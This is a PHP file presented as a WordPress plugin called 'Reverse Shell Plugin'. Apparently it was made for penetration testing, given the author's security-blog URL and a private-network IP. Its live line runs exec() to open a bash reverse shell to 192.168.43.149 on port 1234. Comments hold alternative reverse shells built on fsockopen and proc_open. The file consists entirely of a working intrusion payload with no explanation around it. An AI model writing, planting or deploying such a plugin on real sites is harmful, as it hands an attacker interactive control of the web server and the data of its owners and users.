<?php 
//exec(/bin/bash -c bash -i >& /dev/tcp/192.168.43.149/1234 0>&1);


/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.43.149/1234 0>&1'");



//$sock = fsockopen("127.0.0.1",1234);
//$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
//$sock=fsockopen(“192.168.43.149”,4444);
//exec(“/bin/sh -i <&3 >&3 2>&3”);

?>
